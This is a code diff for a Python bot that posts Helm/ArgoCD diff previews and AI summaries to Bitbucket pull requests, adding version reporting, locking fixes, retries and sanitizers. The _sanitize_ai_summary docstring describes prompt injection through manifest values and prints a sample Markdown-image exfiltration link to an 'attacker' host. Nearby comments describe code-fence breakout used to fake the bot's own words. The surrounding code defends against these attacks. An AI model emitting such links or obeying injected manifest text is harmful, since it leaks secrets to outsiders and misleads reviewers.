@@ -77,6 +77,35 @@ def _env_int(name: str, default: int) -> int:
         return default
 
 
+# Running version, injected at image build (docker.yml passes the git tag as
+# the APP_VERSION build-arg -> ENV). Falls back to "dev" for local runs.
+# v2.5.19 (F1): before this, nothing in the pod told you what version was
+# actually running — the "always verify the live pod image" release step was
+# a manual kubectl exercise. Now it is logged at startup and exposed in /stats.
+APP_VERSION = os.environ.get("APP_VERSION", "dev")
+
+
+def _require_env(*names):
+    """Exit with ONE clear message listing every missing required env var.
+
+    v2.5.19 (F2): the bare os.environ["X"] reads below fail-fast correctly but
+    greet a misconfigured deployment with a raw KeyError for a single var at a
+    time — fix one, redeploy, hit the next. This reports them all at once.
+    Returns None when all are present (also used by tests).
+    """
+    missing = [n for n in names if not os.environ.get(n)]
+    if missing:
+        msg = ("FATAL: missing required environment variable(s): "
+               + ", ".join(missing))
+        print(msg, file=sys.stderr, flush=True)
+        raise SystemExit(msg)
+    return None
+
+
+# Validate everything up front so a misconfigured deployment fails with one
+# actionable message instead of a KeyError cascade.
+_require_env("BB_USER", "BB_TOKEN", "ARGOCD_PASS")
+
 BB_WORKSPACE       = "appspace-cloud"
 BB_REPO            = "acme-config-dev"
 BB_USER            = os.environ["BB_USER"]
@@ -225,6 +254,12 @@ _diff_stats:      dict          = {
     "apps_timeout": 0,       # a diff step exceeded DIFF_TIMEOUT — bughunt N4
     "main_render_cache_hits": 0,   # reused a parsed main-side render — bughunt N4
     "main_render_cache_misses": 0, # had to render main fresh — bughunt N4
+    # v2.5.19 (M8): visibility into the v2.5.18 scale machinery — are these
+    # paths firing in production, and how often?
+    "comments_truncated": 0,       # comments that exceeded MAX_COMMENT_BYTES
+    "ai_prompt_capped": 0,         # AI prompts capped at AI_MAX_APPS
+    "diff_retries": 0,             # per-diff transient retries performed
+    "futures_cancelled": 0,        # subtask futures cancelled on abnormal exit
     "last_iteration_s": None,# seconds taken by most recent iteration
     "last_iteration_at": None,
 }
@@ -365,6 +400,7 @@ class _HealthHandler(BaseHTTPRequestHandler):
             # JSON counters for diff operations — useful for dashboards and alerts
             with _diff_stats_lock:
                 payload = dict(_diff_stats)
+            payload["version"] = APP_VERSION   # v2.5.19 (F1): running version
             data = json.dumps(payload, indent=2).encode()
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -610,8 +646,11 @@ def _invalidate_for_republish(chart_name: str, chart_version: str) -> None:
         for k in [k for k in list(_helm_chart_cache) if k.endswith(suffix)]:
             _helm_chart_cache.pop(k, None)
             evicted += 1
-    for k in [k for k in list(_helm_chart_pull_ts) if k.endswith(suffix)]:
-        _helm_chart_pull_ts.pop(k, None)
+        # v2.5.19 (M3): _helm_chart_pull_ts is guarded by the SAME lock as its
+        # sibling _helm_chart_cache everywhere else; popping it unlocked here
+        # (webhook thread) raced an in-flight pull's timestamp write.
+        for k in [k for k in list(_helm_chart_pull_ts) if k.endswith(suffix)]:
+            _helm_chart_pull_ts.pop(k, None)
     with _helm_pull_locks_lock:
         for k in [k for k in list(_helm_pull_locks) if k.endswith(suffix)]:
             _helm_pull_locks.pop(k, None)
@@ -810,6 +849,32 @@ def _ts():
 # this context only applies to external HTTPS calls: Bitbucket and Vertex AI.
 _ssl = ssl.create_default_context()
 
+def _parse_retry_after(value):
+    """Parse a Retry-After header value into seconds, or None if unusable.
+
+    v2.5.19 (M5): RFC 7231 allows Retry-After as either delta-seconds ("120")
+    or an HTTP-date ("Wed, 21 Oct 2026 07:28:00 GMT"). The old code parsed
+    only the integer form, so Bitbucket's date-form rate-limit hints fell
+    through to plain exponential backoff. Returns a non-negative int; a past
+    date yields 0; garbage yields None so the caller keeps its own backoff.
+    """
+    if not value:
+        return None
+    value = value.strip()
+    if value.isdigit():
+        return int(value)
+    try:
+        from email.utils import parsedate_to_datetime
+        when = parsedate_to_datetime(value)
+        if when is None:
+            return None
+        if when.tzinfo is None:
+            when = when.replace(tzinfo=timezone.utc)
+        delta = (when - datetime.now(timezone.utc)).total_seconds()
+        return max(0, int(delta))
+    except (TypeError, ValueError, OverflowError):
+        return None
+
 def http(method, url, body=None, headers=None, auth=None):
     """HTTP call with exponential backoff on 429/503/network errors."""
     hdrs = dict(headers or {})
@@ -833,10 +898,11 @@ def http(method, url, body=None, headers=None, auth=None):
                     # windows run ~60s while our old total backoff was ~3s,
                     # so a storm failed straight through (bughunt F4).
                     # Capped so a broken header cannot stall the loop.
-                    try:
-                        wait = max(wait, min(int((e.headers or {}).get("Retry-After", "")), 60))
-                    except (TypeError, ValueError):
-                        pass
+                    # v2.5.19 (M5): also parse the HTTP-date form of
+                    # Retry-After, not just delta-seconds.
+                    ra = _parse_retry_after((e.headers or {}).get("Retry-After"))
+                    if ra is not None:
+                        wait = max(wait, min(ra, 60))
                 log(f"[http] {e.code} on {method} — retry {attempt+1}/2 in {wait}s", "WARNING")
                 time.sleep(wait)
                 last_exc = e
@@ -1055,9 +1121,26 @@ def argocd_login():
 # alongside actual image updates — it lists all deployed image versions.
 # Showing it adds noise: the real change is visible in the Deployment diff.
 # Checksum annotations that cascade from it are also suppressed.
-DIFF_IGNORE_RESOURCE_PATTERNS = [
-    "micro-versions-info",
-]
+def _diff_ignore_patterns(env_value=None):
+    """Built-in noise-resource substrings plus any from DIFF_IGNORE_RESOURCES.
+
+    v2.5.19 (E2): the list used to be a hardcoded constant, so silencing the
+    next noisy auto-generated resource meant a full release. DIFF_IGNORE_RESOURCES
+    (comma-separated substrings) is merged in on top of the built-in default,
+    letting an operator react immediately. Blank entries are dropped.
+    """
+    base = ["micro-versions-info"]
+    raw = env_value if env_value is not None else os.environ.get("DIFF_IGNORE_RESOURCES", "")
+    extra = [p.strip() for p in raw.split(",") if p.strip()]
+    # de-dup while preserving order
+    seen, out = set(), []
+    for p in base + extra:
+        if p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out
+
+DIFF_IGNORE_RESOURCE_PATTERNS = _diff_ignore_patterns()
 
 def _is_checksum_only_section(body: str) -> bool:
     """True when every changed line is a checksum/tracking annotation only.
@@ -1590,13 +1673,34 @@ def _ensure_chart(registry: str, chart: str, version: str) -> str:
         import tempfile as _tf
         os.makedirs(HELM_CACHE_DIR, exist_ok=True)
         tmp_dir = _tf.mkdtemp(dir=HELM_CACHE_DIR, prefix=f"{chart}-{version}-")
+        # v2.5.19 (R1, community-research round): give each helm pull an
+        # ISOLATED registry-config + cache/config/data home. Helm 3.x has no
+        # file locking around its shared OCI blob store (helm #8059) — the
+        # index-lock fix only lands in Helm 4.1.0 — so concurrent pulls of
+        # DIFFERENT chart:versions (WARM_WORKERS pre-warm + the per-diff pull
+        # pair) racing one shared cache can corrupt a blob ("blob ... not
+        # found"). The per-key pull lock only serializes the SAME
+        # chart:version; different versions still ran fully parallel against
+        # one cache. A private HELM_* home per pull removes the shared mutable
+        # state entirely. The untarred chart still lands in tmp_dir -> chart_dir
+        # as before; only helm's transient registry/cache scratch is isolated,
+        # and it is cleaned up with tmp_dir on every path.
+        _helm_home = _tf.mkdtemp(dir=HELM_CACHE_DIR, prefix=f".helmhome-{chart}-")
+        _pull_env = dict(os.environ)
+        _pull_env.update(
+            HELM_REGISTRY_CONFIG=os.path.join(_helm_home, "registry-config.json"),
+            HELM_REPOSITORY_CACHE=os.path.join(_helm_home, "repository"),
+            HELM_CACHE_HOME=os.path.join(_helm_home, "cache"),
+            HELM_CONFIG_HOME=os.path.join(_helm_home, "config"),
+            HELM_DATA_HOME=os.path.join(_helm_home, "data"),
+        )
         last_err = ""
         try:
             for pull_attempt in range(3):
                 r = subprocess.run(
                     [HELM_BIN, "pull", f"oci://{registry}/{chart}",
                      "--version", version, "--untar", "-d", tmp_dir],
-                    capture_output=True, text=True, timeout=120)
+                    capture_output=True, text=True, timeout=120, env=_pull_env)
 
                 if r.returncode == 0:
                     break  # success
@@ -1641,11 +1745,18 @@ def _ensure_chart(registry: str, chart: str, version: str) -> str:
         except Exception:
             shutil.rmtree(tmp_dir, ignore_errors=True)
             raise
+        finally:
+            # v2.5.19 (R1): the isolated helm home is scratch — always remove
+            # it, on success, failure, or exception.
+            shutil.rmtree(_helm_home, ignore_errors=True)
 
         path = _find_chart_subdir(chart_dir)
         with _helm_cache_lock:
             _helm_chart_cache[key] = path
-        _helm_chart_pull_ts[key] = time.monotonic()
+            # v2.5.19 (M3): the timestamp write belongs inside the same lock
+            # as the cache write it pairs with — one line outside it raced
+            # the webhook thread's locked eviction of this exact key.
+            _helm_chart_pull_ts[key] = time.monotonic()
         return path
 
 
@@ -1688,6 +1799,13 @@ def _prune_helm_cache():
         version_dirs = []
         for registry in os.listdir(HELM_CACHE_DIR):
             reg_path = os.path.join(HELM_CACHE_DIR, registry)
+            # v2.5.19 (R1): reap isolated per-pull helm homes left behind by a
+            # pod that was killed mid-pull (the happy path removes them in a
+            # finally). They sit directly under HELM_CACHE_DIR as .helmhome-*
+            # and would otherwise accumulate. Also covers stray pull tmp dirs.
+            if registry.startswith(".helmhome-"):
+                shutil.rmtree(reg_path, ignore_errors=True)
+                continue
             if not os.path.isdir(reg_path):
                 continue
             for chart in os.listdir(reg_path):
@@ -3176,6 +3294,14 @@ def _run_one_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None
     # work for free; running tasks are already bounded by their own
     # subprocess timeouts, and cancel() on a done future is a no-op.
     _diff_futs = []
+
+    def _cancel_futs():
+        # S4 helper + v2.5.19 M8 counter: cancel every abandoned shared-pool
+        # future and record how many were actually still cancellable.
+        n = sum(1 for _f in _diff_futs if _f.cancel())
+        if n:
+            with _diff_stats_lock:
+                _diff_stats["futures_cancelled"] += n
     try:
         # Optimization: value files not changed in this PR are byte-identical at
         # pr_sha and main_sha. Fetch them only once (at main_sha) and reuse for
@@ -3295,8 +3421,7 @@ def _run_one_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None
 
         pr_yaml, pr_err = pr_fut.result(timeout=DIFF_TIMEOUT)
         if pr_err:
-            for _f in _diff_futs:
-                _f.cancel()
+            _cancel_futs()
             return None, _render_reason(pr_err), pr_err
 
         if needs_main_render:
@@ -3313,12 +3438,10 @@ def _run_one_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None
                         del _main_render_cache[k]
 
     except (subprocess.TimeoutExpired, concurrent.futures.TimeoutError):
-        for _f in _diff_futs:
-            _f.cancel()   # S4: never leave zombies in the shared pool
+        _cancel_futs()   # S4: never leave zombies in the shared pool
         return None, REASON_TIMEOUT, f"render exceeded {DIFF_TIMEOUT}s"
     except Exception as e:
-        for _f in _diff_futs:
-            _f.cancel()   # S4: same rule for every abnormal exit
+        _cancel_futs()   # S4: same rule for every abnormal exit
         return None, REASON_RENDER, str(e)[:200]
 
     pr_resources = _parse_manifest_resources(pr_yaml)
@@ -3331,7 +3454,11 @@ def _run_one_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None
 
 def _indeterminate(reason, detail):
     """Build an INDETERMINATE DiffResult (diff could not be computed)."""
-    return DiffResult("", [], 0, False, detail[:400], OUT_INDETERMINATE, reason)
+    # v2.5.19 (R2): redact before storing — this .error is rendered into the
+    # PR comment and the build status, and helm's YAML errors echo the
+    # offending source line (secrets included).
+    return DiffResult("", [], 0, False, _redact_error_detail(detail)[:400],
+                      OUT_INDETERMINATE, reason)
 
 
 # Retry budget for a single diff. During a mass version bump the hub is briefly
@@ -3391,6 +3518,8 @@ def argocd_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None, 
             # Transient: retry with backoff while attempts remain.
             if reason in RETRYABLE_REASONS and attempt < last_attempt:
                 delay = _diff_backoff(attempt)
+                with _diff_stats_lock:
+                    _diff_stats["diff_retries"] += 1
                 print(f"    [{app}] {reason} (attempt {attempt + 1}/{DIFF_RETRIES}), "
                       f"retrying in {delay:.0f}s: {(detail or '')[:80]}", flush=True)
                 time.sleep(delay)
@@ -3626,6 +3755,8 @@ def upsert_comment(pr_id, body, existing_id=None):
     orig_bytes = len(body.encode("utf-8"))
     if orig_bytes > MAX_COMMENT_BYTES:
         body = _truncate_comment(body)
+        with _diff_stats_lock:
+            _diff_stats["comments_truncated"] += 1
         log(f"[comment] truncated: {orig_bytes//1024}KB -> "
             f"{MAX_COMMENT_BYTES//1024}KB (footer/tokens preserved)", "WARNING")
     payload = {"content": {"raw": body}}
@@ -3789,6 +3920,39 @@ def _gcp_access_token() -> str:
         exp = resp.get("expires_in", "?")
         print(f"      [AI] Token refreshed (valid for {exp}s)")
         return _gcp_token
+
+def _sanitize_ai_summary(text: str) -> str:
+    """Strip active/exfiltration Markdown from model output before it is
+    posted as a PR comment.
+
+    v2.5.19 (R6, community-research round): the AI summary is model output
+    built from untrusted rendered manifest values, which makes it an indirect
+    prompt-injection sink. The documented "Markdown image exfiltration"
+    channel (Checkmarx, against Copilot Chat and Gemini) is zero-click: a
+    model coaxed into emitting ![x](https://attacker/?d=<secret>) makes the
+    reviewer's browser fetch that URL on render. Cross-vendor "Comment-and-
+    Control" research showed AI review bots posting attacker-chosen content
+    into PR comments. We do not trust the model not to be steered, so we
+    strip, from its output only (never from our deterministic head line):
+      - Markdown images ![alt](url) -> alt text kept, image dropped
+      - raw HTML tags (img/picture/script/style/anchors/comments)
+      - autolinked bare URLs left as text but de-linked from any image use
+      - triple-backtick fences (the model must not open its own fences)
+    The summary is advisory prose; none of these belong in it, so removing
+    them cannot lose diff information.
+    """
+    if not text:
+        return text
+    t = text
+    # Markdown image -> keep alt text, drop the URL entirely.
+    t = re.sub(r'!\[([^\]]*)\]\([^)]*\)', r'\1', t)
+    # HTML comments (hidden instructions) and any raw tags.
+    t = re.sub(r'<!--.*?-->', '', t, flags=re.DOTALL)
+    t = re.sub(r'</?[A-Za-z][^>]*>', '', t)
+    # The model must never open a code fence in an advisory summary.
+    t = _fence_safe(t)
+    return t.strip()
+
 
 def _normalize_ai_markdown(text: str) -> str:
     """Ensure the AI output renders correctly in Bitbucket Markdown.
@@ -3975,6 +4139,34 @@ def _redact_k8s_env_pairs(text: str) -> str:
     return "\n".join(out)
 
 
+def _fence_safe(text: str) -> str:
+    """Neutralize triple-backtick sequences so untrusted rendered content
+    cannot break out of the ```diff code fence it is placed in.
+
+    v2.5.19 (R4, community-research round): a value in a rendered manifest
+    (e.g. a ConfigMap holding a Markdown MOTD) can contain ```, which closes
+    the bot's own code fence and lets the rest of that value render as live
+    Markdown in the PR comment — enough to inject a fake "Status: SUCCESS"
+    line or hidden content that a reviewer reads as the bot's own words. We
+    insert a zero-width space between the backticks: the fence sequence is
+    broken (three separate spans, not a fence token) while the text still
+    reads as ``` to a human. Applied to every body placed inside a fence.
+    """
+    return text.replace("```", "`\u200b`\u200b`")
+
+
+def _show_cr(text: str) -> str:
+    """Make carriage returns visible in a display diff.
+
+    v2.5.19 (E3): a PR that only flips CRLF<->LF in a value file produces
+    rendered -/+ pairs that look byte-identical (the \\r is invisible), which
+    reads as a broken diff. Replace a trailing \\r with a visible symbol (␍,
+    U+240D) so the real change is obvious. Only trailing \\r is touched; a
+    bare \\r mid-line would be unusual in helm output and is left alone.
+    """
+    return text.replace("\r\n", "\u240d\n").replace("\r", "\u240d")
+
+
 def _mask_block_line(line: str) -> str:
     """Replace the content of a block-scalar continuation line with a marker,
     preserving the diff marker and indentation for readability (v2.5.0 H3)."""
@@ -4000,6 +4192,36 @@ def _redact_for_display(hdr: str, body: str) -> str:
     if re.search(r"/Secret[\s/]", hdr + " "):
         return _redact_secret_section(body)
     return _redact_k8s_env_pairs(_redact_sensitive(body))
+
+
+def _redact_error_detail(detail: str) -> str:
+    """Redact secret-looking values from a helm/render error before it can
+    reach a PR comment or a build status.
+
+    v2.5.19 (R2, community-research round): helm's YAML errors echo the
+    offending source line verbatim ("yaml: line 5: password: hunter2 ..."),
+    so a parse failure on a value file leaked whatever was on that line into
+    the comment — the same class as Argo CD CVE-2025-23216 (secrets shown in
+    error messages and the diff view). This masks the value after any
+    `<sensitive-key>:` or `<sensitive-key>=` token while keeping the key name
+    and the surrounding message intact for diagnosis. Fail-safe: on any regex
+    trouble, returns a generic string rather than risking the raw detail.
+    """
+    if not detail:
+        return detail
+    try:
+        # key: value  and  key=value  where the key looks sensitive.
+        def _mask(match):
+            return f"{match.group(1)}{match.group(2)}[REDACTED]"
+        pattern = re.compile(
+            r'(?i)\b([A-Za-z0-9_.\-]*'
+            r'(?:password|passwd|pwd|secret|token|key|auth|credential|bearer'
+            r'|jwt|dsn|session|cookie|connection[-_]?string)'
+            r'[A-Za-z0-9_.\-]*\s*[:=]\s*)(["\']?)\S.*',
+        )
+        return pattern.sub(_mask, detail)
+    except Exception:
+        return "(error detail withheld — could not be safely redacted)"
 
 
 def _redact_sensitive(text: str) -> str:
@@ -4114,6 +4336,8 @@ def generate_ai_summary(app_results: dict) -> str | None:
             prompt_apps = sorted(
                 changed, key=lambda a: results[a].n_res, reverse=True)[:AI_MAX_APPS]
             omitted = len(changed) - AI_MAX_APPS
+            with _diff_stats_lock:
+                _diff_stats["ai_prompt_capped"] += 1
             print(f"      [AI] Prompt capped to {AI_MAX_APPS} of "
                   f"{len(changed)} changed apps ({omitted} omitted)")
 
@@ -4259,7 +4483,7 @@ def generate_ai_summary(app_results: dict) -> str | None:
             f"{total_resources} resource(s) changed**\n\n"
             f"{env_line}\n\n"
         )
-        return _normalize_ai_markdown(head + ai_text)
+        return _normalize_ai_markdown(head + _sanitize_ai_summary(ai_text))
     except Exception as e:
         err_str = str(e)
         if "404" in err_str and "does not have access" in err_str:
@@ -4324,12 +4548,17 @@ def _format_app_diff_block(app, sections, diff_text, show_diff=True, n_res=None)
             # each body here WITH an explicit marker. Redact BEFORE the
             # cut so truncation can never split a value a redaction rule
             # would have caught.
-            body_disp = _redact_for_display(hdr, body).rstrip()
+            # v2.5.19 E3: make CR visible BEFORE redaction — the redaction
+            # helpers use splitlines(), which silently eats a trailing \r, so
+            # a CRLF<->LF-only change would otherwise collapse to "no visible
+            # change". Convert first, then redact, then neutralize fences.
+            body_disp = _redact_for_display(hdr, _show_cr(body)).rstrip()
             if len(body_disp) > DISPLAY_BODY_MAX_CHARS:
                 body_disp = (body_disp[:DISPLAY_BODY_MAX_CHARS].rstrip()
                              + "\n... (diff truncated for display \u2014 see "
                                "ArgoCD for the full resource diff)")
-            out += [f"**`{hdr}`**", "", "```diff", body_disp, "```", ""]
+            body_disp = _fence_safe(body_disp)
+            out += [f"**`{_fence_safe(hdr)}`**", "", "```diff", body_disp, "```", ""]
     elif diff_text:
         # v2.5.17: this fallback (sections not supplied -- reachable through
         # _result()'s legacy 3-tuple coercion, which rebuilds sections with
@@ -4351,12 +4580,12 @@ def _format_app_diff_block(app, sections, diff_text, show_diff=True, n_res=None)
         legacy_secs = parse_diff_sections(diff_text)
         if legacy_secs:
             redacted = "\n".join(
-                f"===== {hdr} =====\n{_redact_for_display(hdr, body).rstrip()}"
+                f"===== {hdr} =====\n{_redact_for_display(hdr, _show_cr(body)).rstrip()}"
                 for hdr, body in legacy_secs
             )
         else:
-            redacted = _redact_sensitive(diff_text).rstrip()
-        out += ["```diff", redacted, "```", ""]
+            redacted = _redact_sensitive(_show_cr(diff_text)).rstrip()
+        out += ["```diff", _fence_safe(redacted), "```", ""]
     return out
 
 
@@ -4943,6 +5172,14 @@ def process_pr(pr, path_map, base_sha=""):
                     if _shutdown:
                         log(f"SIGTERM received mid-batch — draining remaining futures",
                             "WARNING")
+                        # v2.5.19 (M4): cancel the still-queued diffs instead of
+                        # letting the `with` exit block on shutdown(wait=True)
+                        # for the whole queue — on a mass PR that overran
+                        # terminationGracePeriodSeconds and got SIGKILLed. The
+                        # partial-results guard already prevents a false comment;
+                        # this just lets the drain actually be graceful.
+                        for f in futures:
+                            f.cancel()
                         break
                     app = futures[fut]
                     try:
@@ -5349,6 +5586,7 @@ def main():
     """Start health server, login to ArgoCD, then run poll loop until SIGTERM."""
     global _last_ok, _loop_idle
     log("acme-diff-preview starting (Deployment mode, helm-template diff)",
+        version=APP_VERSION,
         argocd_server=ARGOCD_SERVER, argocd_user=ARGOCD_USER,
         bb_repo=BB_REPO, diff_workers=DIFF_WORKERS, pr_workers=MAX_PR_WORKERS,
         max_apps_per_run=MAX_APPS_PER_RUN, diff_timeout=DIFF_TIMEOUT,
